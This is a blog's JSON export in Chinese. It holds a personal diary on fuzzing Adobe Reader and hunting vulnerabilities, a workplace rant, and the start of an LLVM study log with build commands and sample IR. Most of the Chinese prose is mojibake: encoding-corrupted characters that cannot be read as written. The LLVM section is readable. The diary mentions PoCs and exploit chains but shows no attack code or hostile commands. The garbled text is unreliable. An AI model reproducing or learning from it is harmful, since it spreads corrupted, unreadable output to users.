ã€‚å¿™ç€å·¥ä½œçš„äº‹ï¼ŒæŒºå¼€å¿ƒçš„ï¼Œåšå–œæ¬¢çš„äº‹ï¼Œè™½ç„¶æ„Ÿè§‰æŒºéš¾çš„ï¼Œä¸è¿‡æœ‰æŒ‘æˆ˜æ€§æ‰æ›´æœ‰æ„æ€ã€‚blogæ„Ÿè§‰å¾ˆä¹…ä¸ä¼šå†å»æ›´æ–°äº† 2333333 æ˜¨æ™šå’Œæœ‹å‹èŠå¤©ï¼Œè¢«è¯´ï¼šæ¯”èµ·å–œæ¬¢ï¼Œæˆ‘è§‰å¾—ä½ æ›´éœ€è¦äººé™ªã€‚ å‡çš„å‡çš„ã€‚ 2017-08-20é‡åˆ°ä¸¤ä¸ªä¸èƒ½å¤ç°çš„crashäº†ï¼Œå¾ˆå¿ƒç´¯ã€‚å‡†å¤‡é‡å†™fuzzæ¡†æ¶é‡æ–°æäº‹äº†ã€‚ 2017-08-24è§£å†³äº†ä¹‹å‰çš„bugï¼Œåˆé‡åˆ°äº†æ–°çš„â€¦ 2017-09-26å†æ¥å†å‰ 2017-10-27æ„¿æ­¤é—´ å±±æœ‰æœ¨å…®å¿æœ‰æ„æ˜¨å¤œæ˜Ÿè¾°æ°ä¼¼ä½  2017-12-302017å°±å¿«è¿‡å®Œäº†ï¼Œæˆ‘è¿˜åœ¨æç€adobe readerã€‚èŠ±å¼ç©ºæŒ‡é’ˆï¼Œfuzzerè¿˜åœ¨å®Œå–„ï¼Œå„ç§å„æ ·çš„é—®é¢˜ï¼Œè§‰å¾—éš¾åˆè§‰å¾—ä¸éš¾ã€‚æ€è·¯éƒ½å¾ˆå¥½ç©ï¼Œåªæ˜¯è‡ªèº«èƒ½åŠ›æœ‰é™ï¼Œå•ƒä¸åŠ¨ã€‚éœ€è¦æ—¶é—´å»ç§¯ç´¯ã€‚ è€Œä¸”å°±åœ¨æ˜¨å¤©ï¼Œå‘ç°è‡ªå·±ä¹‹å‰æ¼æ‰äº†ä¸€ä¸ªæ”»å‡»ç‚¹â€¦ç®€ç›´è¡€äºã€‚ å¹æ¯â€¦ 2018-2-14è¿‡ä¸è¿‡èŠ‚æ„Ÿè§‰æ²¡å•¥åŒºåˆ«å•Š-ã€‚-ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹çœŸçš„æ˜¯ä¸€æœ¬ä¸å¯å¤šå¾—çš„å¥½ä¹¦ã€‚ç»ˆäºçœ‹åˆ°IRç”Ÿæˆéƒ¨åˆ†äº†ï¼Œå…ˆæŠŠå…¬å¼€è¯¾å…³äºä¸­é—´ä»£ç ç”Ÿæˆçš„éƒ¨åˆ†æå®šäº†ï¼Œå†å»çœ‹è¿™æœ¬ä¹¦è¿™éƒ¨åˆ†çš„å†…å®¹ï¼Œç„¶åå†å»çœ‹å®ƒçš„ä»£ç ã€‚ æœ‰å‡ å¤©æ²¡å»æå·¥ä½œä¸Šçš„äº‹äº†ï¼Œåªæ˜¯çœ‹çœ‹paperå’Œslideï¼Œæ„Ÿè§‰å¥½å’¸é±¼å•Šã€‚ :( æœ€åï¼Œé«˜è€å¸ˆèŠ‚æ—¥å¿«ä¹-ã€‚- 2018-2-28å¿«è¦å»å­¦æ ¡äº†ã€‚å·¥ä½œæœ‰ç‚¹è¿›å±•äº†ï¼Œè¿˜åœ¨çœ‹grinderæºç ï¼Œè¦æ”¹é€ ï¼Œlong way to go ç¼–è¯‘åŸç†å­¦ä¹ ä¸­ã€‚ 2018-4-29çœŸçš„æƒ³åæ§½ã€‚æœ€è¿‘æ¯”èµ›ä»€ä¹ˆç©æ„ã€‚ 2018-6-9é˜…è¯»paperï¼Œé˜…è¯»æºç ï¼Œå­¦ä¹ åˆ«äººçš„æ€è·¯ã€‚å¥½å¥½çœ‹ä¹¦ï¼Œæƒ³æ‹¿antlr4æå¤§äº‹ã€‚ 2018-8-13æœ¬æ¥å·¥ä½œçš„ç¬¬ä¸€ä¸ªæœˆå¼€å¼€å¿ƒå¿ƒï¼Œå­¦ä¸œè¥¿ä¹Ÿçœ‹å¿ƒï¼Œçˆ½çš„ä¸€æ‰¹ã€‚ä½†æ˜¯å…«æœˆä»½é£æ‰¬ä¸€å¼€å§‹ï¼Œå°±TMè´Ÿèƒ½é‡çˆ†æ£šã€‚ è¾£é¸¡é£æ‰¬ï¼ŒåŠé€€ç³»åˆ—ï¼Œæ´—è„‘ç‰¹ä¹ˆå¤±è´¥äº†ã€‚çœ‹çœ‹æŸå¸ã€æŸå¸ã€æŸå¸â€¦å“ªå®¶åƒä½ ä»¬è¿™ä¹ˆæäººï¼Ÿè€½è¯¯æ­£å¸¸å·¥ä½œå¥½å§ï¼Œæµªè´¹æ—¶é—´å¥½å§ã€‚ 2018-11-10å…³äºcode coverageï¼Œå¯¹æ ¼å¼ç±»fuzzå¾ˆæœ‰æ„ä¹‰ï¼Œä½†æ˜¯è¯­æ³•ã€è„šæœ¬å¼•æ“è¿™ç§é é€»è¾‘çš„ä¸œè¥¿ï¼Œæ„ä¹‰ä¼¼ä¹æ²¡é‚£ä¹ˆå¤§ã€‚å·¥ä½œçš„è›®å¼€å¿ƒï¼Œå‹åŠ›åŠ¨åŠ›å¹¶å­˜ï¼Œå¸Œæœ›è‡ªå·±èƒ½æ‰›è¿‡å»ï¼Œå®Œæˆèœ•å˜ã€‚ 2018-11-26å¤©åºœæ¯ç»“æŸï¼Œç»§ç»­åŠªåŠ›ã€‚ç»™è‡ªå·±å¼€äº†ä¸¤ä¸ªå¤§å‘ï¼Œä¸€ä¸ªæ˜¯å…³äºæ–‡ä»¶æ ¼å¼ï¼Œä¸€ä¸ªå…³äºä»£ç ç”Ÿæˆï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¦åšå¥½ä¹…â€¦æ›´åˆ«æè¿˜æœ‰å¾ˆå¤šæ¼æ´éœ€è¦åˆ†æï¼ŒçŸ­æœŸå†…åº”è¯¥ä¸ä¼šæäº¤æ¼æ´äº†ã€‚ 2018-12-2è°ƒäº†ä¸€å¤©æ´ï¼Œæ„Ÿè§‰çŒœæƒ³æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯è°ƒè¯•ä¸‹æ¥å°±ä¸å¯¹â€¦çœŸå¥‡æ€ªå•Šã€‚åˆè¦ä»é›¶å¼€å§‹ç–¯ç‹‚ææŒ–æ˜äº†â€¦ å¸Œæœ›æœ‰ç‚¹äº§å‡º 2018-12-6æ¯æ¬¡å’Œç”·å“¥èŠï¼Œéƒ½æ„Ÿå¹ä»–æ€è€ƒé—®é¢˜çš„é«˜åº¦å’Œè§’åº¦ï¼Œæ„Ÿè§‰è‡ªå·±æ€è€ƒé—®é¢˜å¾ˆå±€é™æ€§ï¼Œè€Œä¸”åªçœ‹åˆ°çœ¼å‰ï¼Œæ²¡æœ‰åšæ›´å¤šçš„ã€æ›´é•¿è¿œçš„è€ƒè™‘:(too youngå•Šè¿˜æ˜¯ 2018-12-21åˆç—…å€’äº†ï¼Œå—“å­å‘ç‚äº†ï¼Œå–æ°´å–äº†å¥½å¤šâ€¦ ddlåœ¨é€¼è¿‘ï¼Œä¸€å®šè¦æŠ—ä½å‹åŠ›å‰è¿›ã€‚ éå·¥ä½œæ—¶é—´çš„å°è®¡åˆ’ä¹Ÿåœ¨ä¸€ç‚¹ç‚¹è¿›è¡Œï¼Œçœ‹ä¹¦å­¦ä¹ ä»€ä¹ˆçš„ï¼ŒåŠ æ²¹ã€‚ åŠªåŠ›ç¨‹åº¦çœŸçš„è¿˜æ²¡åˆ°æ‹¼å¤©èµ‹é‚£ä¸€æ­¥å§ã€‚ 2018-12-25åœ£è¯èŠ‚å¿«ä¹ï¼Œè¿™å‡ å¤©çš„ç—…ç»ˆäºå¥½è½¬äº†ä¸€ç‚¹ç‚¹ï¼Œæƒ³èµ·å‘¨å…­åœ¨åŒ»é™¢æŒ‚ä¸ä¸Šå·ã€æ€¥è¯Šç­‰ä¸åˆ°çš„åœºæ™¯ï¼Œé‚£ä¸€åˆ»çœŸçš„å¾ˆæƒ³é€ƒç¦»åŒ—äº¬ã€‚å¥½æ¶ˆæ¯æ˜¯ï¼Œå› ä¸ºç”Ÿç—…ï¼Œå¥½åƒåªç¡äº†å…­å°æ—¶ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå¤šçš„æ—¶é—´æ‹¿æ¥çœ‹ä¹¦äº†â€¦é€†å‘ä¸Šç»ˆäºæœ‰æ›´å¥½çš„è¿›å±•äº†ï¼Œæˆ‘æ„Ÿè§‰æœ‰0dayåœ¨ç­‰æˆ‘äº†ï¼ŒåŠ æ²¹ã€‚ 2018-12-28 githubå¼€äº†ä¸ªä»“åº“ï¼Œæ”¾è‡ªå·±æŒ–åˆ°çš„æ´pocä»¥åŠä¸€äº›æ”¶é›†åˆ°çš„pocï¼Œå¯èƒ½ä¼šè·Ÿä¸Šåˆ†æã€‚ æ„Ÿå¹ï¼Œå¯èƒ½readerçš„ä»£ç çœŸçš„å¤ªè€äº†å§ã€‚ã€‚ é‡åˆ°äº†å¥‡è‘©çš„å†…å­˜æ–­ç‚¹æ–­ä¸ä¸‹æ¥çš„æƒ…å†µï¼Œè¿˜æ²¡æ³•è§£å†³ã€‚ã€‚å¿ƒç´¯ 2018-12-31æ™®é€šçš„ä¸€å¤©ï¼ŒæŠŠè‡ªå·±çš„mbpæ“¦çš„å¹²å¹²å‡€å‡€ï¼Œæ–°å¹´æ–°æ°”è±¡äº†ã€‚ æ–°çš„ä¸€å¹´ï¼Œå¸Œæœ›ï¼š æŒ–åˆ°æ›´å¤šçš„æ´ï¼ŒRCEï¼› è‡ªå·±çš„éå·¥ä½œæ—¶é—´çš„Rock Leeè®¡åˆ’é¡ºåˆ©æ‰§è¡Œï¼Œå¹¶ä¸”èƒ½æœ‰æˆæ•ˆï¼› å­¦åˆ°æ›´å¤šä¸œè¥¿ï¼Œåœ¨éèˆ’é€‚åŒºæˆé•¿ã€‚ 2019-2-1è¦å›å®¶äº†ã€‚ åˆšå¼€å§‹åŠå¹´å·¥ä½œå¹²çš„è¿˜ä¸é”™ï¼Œä¹Ÿæœ‰å¾ˆå¤šæ”¶è·ã€‚ å·¥ä½œå‹åŠ›å¤§ï¼Œä½†æ˜¯åŠ¨åŠ›æ›´å¤§ï¼›æœ€è¿‘æå®šäº†ä¸€äº›é—®é¢˜ï¼Œæ–°çš„æ€è·¯ä¹Ÿå¾—ä»¥å®è·µï¼Œä¸€åˆ‡éƒ½ä¸é”™ã€‚ã€‚ ä¸è¿‡è¿˜æœ‰å¾ˆå¤šäº‹æ²¡åšå•Šï¼Œæ–°fuzzæ¡†æ¶çš„è§„èŒƒåŒ–ï¼Œå¹³å°ç¼–å†™ï¼Œä¸ä¹‹ç›¸å…³çš„ä¸€äº›ä¸œè¥¿è¿˜æ²¡å†™å®Œå‘¢ã€‚ã€‚ ç»§ç»­åŠ æ²¹ï¼Œäº‰å–å‡ºæ›´å¤šçš„0dayå§ :) 2019-2-3fuzzè·‘çš„è¿˜ç®—ç¨³å®šï¼Œéœ€è¦æ¥å…¥æ›´å¤šçš„ä¸œè¥¿ï¼Œæƒ³åŠæ³•æçš„é€šç”¨ä¸€ç‚¹ï¼Œç°åœ¨è¿˜æ˜¯éœ€è¦å¤ªå¤šäººä¸ºå¹²é¢„äº†ï¼› ä»Šå¤©éƒ½äºŒåä¹äº†ï¼Œè¿˜æ˜¯å†™äº†ç‚¹ä»£ç ï¼Œåšäº†ä¸€ä¸ªpoc dbï¼ŒæŠŠæ”¶é›†åˆ°çš„æ–‡ä»¶ï¼ŒæŒ‰ç…§ä¸åŒçš„æ ¼å¼ï¼Œåšå¥½åˆ†ç±»ï¼Œ æ–¹ä¾¿æ—¥åfuzzä½¿ç”¨ã€‚ è¿™æ ·çš„è¯ï¼Œè¿˜éœ€è¦å†™çˆ¬è™«äº†ï¼Œçˆ¬å¾ˆå¤šçš„æ ·æœ¬ä¸‹æ¥â€¦ 2019-4-27å†æ¥ä¸€ä¸ªä¿¡æ¯æ³„æ¼å°±å¯ä»¥ä¸€å¥—åˆ©ç”¨äº†ï¼ŒåŠ æ²¹ã€‚ æœ€è¿‘é¡ºä¾¿æŠŠä¹‹å‰åšçš„winaflé€šç”¨æ¨¡å¼fuzzå°è£…èµ·æ¥ï¼Œå¼„æˆç±»ä¼¼libfuzzerçš„é‚£ç§æ¨¡å¼ï¼Œæä¾›å‡½æ•°ï¼Œbufferï¼Œlengthï¼Œå°±å¯ä»¥ç›´æ¥fuzz ï¼šï¼‰ åŠ æ²¹å’¯ã€‚ 2019-5-19è°ƒæ´çš„æ ·å­çœŸåƒcxk :( å¤§æ”¹äº†fuzzerï¼Œç­‰ä¸€æ³¢è¾“å‡ºäº†ã€‚ å°è¯•æ–°çš„æŒ–æ´æ€è·¯ä¸­â€¦ 2019-8-7å·®ä¸å¤šå°è¯•äº†ä¸¤ä¸ªæœˆï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„äº§å‡ºï¼Œç°æœ‰çš„éƒ½å¾ˆé¸¡è‚‹ã€‚ å…³é”®çš„é—®é¢˜ï¼šåŸºæœ¬åŠŸã€‚ 2019-11-17xnu_build.shçœŸé¦™ æ¢äº†ä¸ªè·¯çº¿äº†â€¦ 2019-11-23ä¼¼ä¹ä¹‹å‰è¿‡çš„å¤ªå®‰é€¸äº† :( 2020-6-21:) æ‰¾æ‰¾èŠ‚å¥ gogogo","link":"/2017/01/28/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"},{"title":"é£æ‰¬å†é™©è®°","text":"æœ¬æ•…äº‹çº¯å±è™šæ„ï¼Œå¦‚æœ‰é›·åŒï¼Œé‚£å°±é›·åŒå§ã€‚ é£ä¹‹å‰ï¼Œå·¥ä½œåœ°ååˆ†å¼€å¿ƒï¼Œèƒ½æ„Ÿå—åˆ°è‡ªå·±æ¯å¤©åœ¨è¿›æ­¥ï¼Œåæ­£å°±æ˜¯å·¥ä½œçš„å¾ˆå¼€å¿ƒã€‚ è‡ªä»å…«æœˆå…­å·ä¹‹åï¼Œä¸€åˆ‡éƒ½å˜äº†ï¼Œæˆ‘å¼€å§‹å˜å¾—è´Ÿèƒ½é‡çˆ†æ£šï¼Œéª‚è¡—çš„é¢‘ç‡ä¹Ÿé™¡ç„¶å‡é«˜ã€‚ æ¯å¤©9ç‚¹å¤šåˆ°ï¼Œæ™šä¸Šä¸çŸ¥é“å‡ ç‚¹æ‰èƒ½èµ°ï¼Œæœ€æ—©çš„ä¸€æ¬¡åä¸€ç‚¹å››åï¼Œæœ€æ™šçš„ä¸€æ¬¡å‡Œæ™¨ä¸¤ç‚¹å¤šã€‚å¸ƒç½®é‚£ä¹ˆå¤šä¸œè¥¿ï¼Œåƒå¹¼å„¿å›­å°æœ‹å‹ä¸€æ ·çš„æ´»åŠ¨ï¼ŒçœŸçš„æ˜¯æ²¡å•¥æ„ä¹‰ã€‚ åŠä¸ªæœˆçš„æ—¶é—´ï¼Œè€½è¯¯äº†å¾ˆå¤šå·¥ä½œï¼Œå†æ¬¡å›åˆ°å·¥ä½œä¸­ï¼Œæœ‰äº›ä¸é€‚åº”å§ï¼ŒèŠ±äº†ç‚¹æ—¶é—´å»åŒæ­¥ã€é€‚åº”ï¼Œå¤ªè ¢äº†è¿™ä¸ªä¸œè¥¿ã€‚ è®©æˆ‘æƒ…ç»ªæ¯”è¾ƒçˆ†å‘çš„è¿˜æ˜¯åå‡ å¤©ä¸­ï¼Œä¸€ä¸ªå¦¹å­çš„äº‹ï¼Œè¿‡æ•+ä¸Šå‘¼å¸é“æ„ŸæŸ“ï¼Œè¯·å‡å±…ç„¶ä¸å…è®¸ï¼Œè¿˜å¼ºè¡Œè®©äººå®¶å»è„±å£ç§€è®²è¯ï¼Œä¹‹åè¿˜è¯´ä¸åˆæ ¼ï¼Œåå¤©å†æ¥ã€‚çœŸçš„æ˜¯ç‰›é€¼åˆ°ä¸è¡Œã€‚ ä½ ä»¬æ˜¯çœŸçš„éƒ½ä¸ä¼šç”Ÿç—…ï¼Œé“äººï¼Œå¾ˆå‰å®³ï¼Œå¸Œæœ›ä½ ä»¬ç”Ÿç—…çš„æ—¶å€™ä¹Ÿèƒ½åšæŒåšæŒå†åšæŒã€‚ åé¢è¿˜å‘ç”Ÿäº†ç”¨æ‰‹æ‚èµ·äººå®¶ç”µè„‘å±å¹•ï¼Œæ‘”çš„é‚£ç§æ–¹å¼åˆä¸Šå¹¶æ”¶èµ°çš„äº‹ï¼Œä½œä¸ºä¸€ä¸ªITğŸ¶ï¼Œè¿™ä¸ªçœŸçš„ä¸èƒ½å¿ï¼Œé—®å€™ä¸€ä¸‹ä»–å…¨å®¶ã€‚ æŒºæç¬‘çš„ä¸€ä»¶äº‹ï¼Œå®ä¹ ç”Ÿåˆšæ¥å°±åŠä¸ªæœˆè¿™ä¹ˆé™ªç€ä¸€èµ·ç†¬ï¼Œæœ€åä¸€å¤©ç»“æŸçš„æ—¶å€™ï¼Œé¢†å¯¼è¯´å‡ å¥â€œæ„Ÿäººâ€çš„è¯â€¦å…„å¼Ÿï¼Œç°å®ç‚¹ï¼ŒåŠ ç­è´¹ã€‚ æœ€åï¼ŒçœŸçš„å¾ˆæ— èŠï¼Œè‡ªåŠ©éš¾åƒçš„ä¸€æ‰¹ã€‚","link":"/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/"},{"title":"LLVM Study Log","text":"0x0. ç®€è¿°åˆšæ¥è§¦LLVMçš„æ—¶å€™çš„è®°å½•ï¼Œç®—æ˜¯ç¬”è®°å§ï¼Œæƒ³ä»ä»£ç æ··æ·†çš„æ€è·¯å­¦ä¹ ï¼Œå­¦ä¹ å¦‚ä½•å†™Passï¼Œä»¥åŠæŠŠè‡ªå·±å†™çš„Passåº”ç”¨åˆ°å®é™…çš„ç¨‹åºä¸­ã€‚å­¦ä¹ ç¬”è®°æ›´æ–°ä¸­â€¦ 0x1. LLVM1.1 ç®€ä»‹LLVMæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨æ¡†æ¶ï¼ŒLLVMæ¡†æ¶æä¾›çš„ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰ï¼Œå¯ä»¥ä½œä¸ºå¤šç§è¯­è¨€çš„åç«¯ï¼Œå¹¶ä¸”æ ¹æ®IRå¯ä»¥åšè¯­è¨€æ— å…³çš„ä¼˜åŒ–ä»¥åŠç”Ÿæˆå¯¹åº”å„ç§æ„æ¶ï¼ˆx86,amd64,armç­‰ï¼‰çš„ä»£ç ã€‚ ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šå‰ç«¯ã€Passã€åç«¯ å‰ç«¯ï¼š è·å–æºç ï¼Œè½¬æˆIRã€‚ Passï¼šåšå„ç§ä¼˜åŒ–å·¥ä½œæˆ–è€…ä¸€äº›è¿‡ç¨‹çš„å˜æ¢å·¥ä½œã€‚ åç«¯ï¼š ç”Ÿæˆå¯¹åº”å¹³å°çš„æœºå™¨ç ã€‚ 123Source Code ----&gt; Frontend ----&gt; Optimizer ----&gt; Backend ----&gt; Machine Code | Pass Work Here æ›´å¤šç»†èŠ‚ç›´æ¥çœ‹å®˜ç½‘ 1.2 å®‰è£…å®‰è£…çš„è¯ç›´æ¥æŒ‰ç…§å®˜æ–¹çš„æ–‡æ¡£å»å®‰è£…å°±å¯ä»¥äº†. ä¸‹è½½æºç  123$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm$ cd where-you-want-llvm-to-live è¿ç§»å‡ºclang 12$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang è¿è¡Œåº“ 123$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt ç¼–è¯‘ 1234$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make -j x å°±æ˜¯æœ€åç¼–è¯‘çš„æ—¶å€™ï¼Œæ—¶é—´ä¼šæ¯”è¾ƒä¹…ï¼Œmake -j x ï¼Œxç»™çš„å¤§ä¸€ç‚¹ä¼šç¼–è¯‘çš„å¿«ä¸€ç‚¹ã€‚ 1.3 IR1LLVM IRæœ‰ä¸‰ç§å½¢å¼ï¼Œå¯è¯»çš„æ–‡æœ¬å½¢å¼(.ll)ï¼Œç¡¬ç›˜ä¸Šå­˜å‚¨çš„äºŒè¿›åˆ¶å½¢å¼(.bc)ï¼Œå†…å­˜ä¸­çš„ç¼–è¯‘å™¨æ£€æµ‹å’Œä¿®æ”¹çš„å½¢å¼ã€‚ ä¸‹é¢ç¼–å†™æµ‹è¯•ä»£ç ï¼Œæ¥çœ‹ä¸€ä¸‹IRè¯­è¨€ã€‚ 123456789101112131415#include &lt;stdio.h&gt;int test(int a,int b){ return a + b;}int main(int argc,char *argv[]){ int c = 0; c = test(4,6); printf(&quot;I got : %d \\n&quot;,c); return 0; } ç¼–è¯‘clang -emit-llvm test.cpp -S -o test.llå¾—åˆ°IR 12345678910111213141516171819202122232425262728293031323334353637383940414243444546; ModuleID = 'test.cpp'source_filename = &quot;test.cpp&quot;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-unknown-linux-gnu&quot;@.str = private unnamed_addr constant [13 x i8] c&quot;I got : %d \\0A\\00&quot;, align 1; Function Attrs: noinline nounwind uwtabledefine i32 @_Z4testii(i32, i32) #0 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 store i32 %0, i32* %3, align 4 store i32 %1, i32* %4, align 4 %5 = load i32, i32* %3, align 4 %6 = load i32, i32* %4, align 4 %7 = add nsw i32 %5, %6 ret i32 %7}; Function Attrs: noinline norecurse uwtabledefine i32 @main(i32, i8**) #1 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 %7 = call i32 @_Z4testii(i32 4, i32 6) store i32 %7, i32* %6, align 4 %8 = load i32, i32* %6, align 4 %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0), i32 %8) ret i32 0}declare i32 @printf(i8*, ...) #2attributes #0 = { noinline nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }attributes #1 = { noinline norecurse uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }attributes #2 = { &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }!llvm.ident = !{!0}!0 = !{!&quot;clang version 4.0.0 (trunk 291212)&quot;} æ„Ÿè§‰é…åˆç€å®˜ç½‘çš„æ–‡æ¡£ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥è¯»æ‡‚ï¼Œè¯­æ³•ä¹Ÿå¾ˆæ¸…æ™°æ˜äº†ã€‚æ¯”å¦‚testå‡½æ•° 12345678910define i32 @_Z4testii(i32, i32) #0 { //@æ˜¯å…¨å±€æ ‡è¯†ç¬¦ï¼Œ%æ˜¯å±€éƒ¨æ ‡è¯†ç¬¦ %3 = alloca i32, align 4 //å±€éƒ¨å˜é‡å£°æ˜ï¼Œå¹¶åˆ†é…ç©ºé—´ï¼Œ4å­—èŠ‚å¯¹é½ %4 = alloca i32, align 4 store i32 %0, i32* %3, align 4 //åˆšæ‰çš„å˜é‡å­˜å‚¨åœ¨ 0å·å¯„å­˜å™¨çš„ä½ç½® store i32 %1, i32* %4, align 4 //..............1å·å¯„å­˜å™¨çš„ä½ç½® %5 = load i32, i32* %3, align 4 %6 = load i32, i32* %4, align 4 //åˆ†åˆ«è½½å…¥åˆ°5å·å¯„å­˜å™¨å’Œ6å·å¯„å­˜å™¨çš„ä½ç½® %7 = add nsw i32 %5, %6 //ç„¶åç›¸åŠ ï¼Œå­˜åˆ°7å·å¯„å­˜å™¨çš„ä½ç½® ret i32 %7 //è¿”å›ç»“æœï¼ˆ32ä½æ•´æ•°ï¼‰} å¼±å¼±çš„è¯´ä¸€å¥â€¦æ„Ÿè§‰å¥½åƒJAVAå­—èŠ‚ç å•Š æ›´å¤šçš„å†…å®¹ï¼Œè¿˜æ˜¯å®˜æ–¹æ–‡æ¡£ 0x2. PassPass çš„ä¸»è¦åˆ†ç±»æœ‰ä»¥ä¸‹å‡ ç§ã€‚ ImmutablePass Immutable,å­—é¢æ„æ€ä¸€æˆä¸å˜ï¼Œå³è¿™ç§passä¸æ˜¯æ™®é€šçš„ç”¨æ¥è½¬æ¢ã€åˆ†æçš„passï¼Œä»–å¯ä»¥æä¾›å½“å‰ç¼–è¯‘å™¨é…ç½®çš„ä¿¡æ¯ã€‚è¿™ç§passä¸éœ€è¦è¿è¡Œã€ä¹Ÿä¸æ”¹å˜çŠ¶æ€ã€ä¹Ÿä¸éœ€è¦æ›´æ–°ã€‚ MoudlePass ä»ModulePassæ´¾ç”Ÿè¡¨ç¤ºè¿™ä¸ªpassä½¿ç”¨æ•´ä¸ªç¨‹åºä½œä¸ºä¸€ä¸ªå•å…ƒï¼Œä¸å¯é¢„æµ‹çš„é¡ºåºå¼•ç”¨å‡½æ•°ä½“ï¼Œæˆ–è€…æ·»åŠ ã€åˆ é™¤å‡½æ•°ï¼›è¿™ç§passå¯¹å­ç±»è¡Œä¸ºå¹¶ä¸äº†è§£ï¼Œæ‰€ä»¥æ— æ³•å¯¹å…¶åšä¼˜åŒ–ã€‚ CallGraphSCCPass è¿™ç§éœ€è¦éå†è‡ªä¸‹è€Œä¸Šçš„å‡½æ•°è°ƒç”¨å›¾ã€‚ FuncationPass åœ¨æ¯ä¸ªå‡½æ•°ä¸Šæ‰§è¡Œã€‚è¿™ä¸ªpasså†llvmçš„æ–‡æ¡£ä¸Šæœ‰ä¾‹å­ï¼Œé‚£ä¸ªhello worldçš„ä¾‹å­ã€‚ LoopPass è¿™ç§å†æ¯ä¸ªå¾ªç¯ä¸Šæ‰§è¡Œï¼Œä¸å‡½æ•°ä¸­å…¶ä»–çš„å¾ªç¯æ— å…³ï¼›LoopPassä½¿ç”¨åµŒå¥—é¡ºåºå¤„ç†å¾ªç¯ï¼Œå¤–å±‚æœ€åå¤„ç†ã€‚ RegionPass ç±»ä¼¼LoopPassï¼Œä½†æ˜¯åœ¨å‡½æ•°æ‰§è¡Œä¸­çš„æ¯ä¸ªå•ä¸ªæ¡ç›®çš„é€€å‡ºåŒºåŸŸä¸Šæ‰§è¡Œã€‚è¿˜æ˜¯åµŒå¥—é¡ºåºå¤„ç†åŒºåŸŸï¼Œå³æœ€å¤–éƒ¨çš„åŒºåŸŸæœ€åè¢«å¤„ç†ã€‚ BasicBlockPass ç±»ä¼¼FunctionPassï¼Œä½†æ˜¯å¿…é¡»ä¸€æ¬¡é™åˆ¶å®ƒä»¬å¯¹åŸºæœ¬å—çš„æ£€æŸ¥å’Œä¿®æ”¹èŒƒå›´ï¼Œå…·ä½“çš„é™åˆ¶è§æ–‡æ¡£ã€‚ MachineFunctionPass LLVMä»£ç 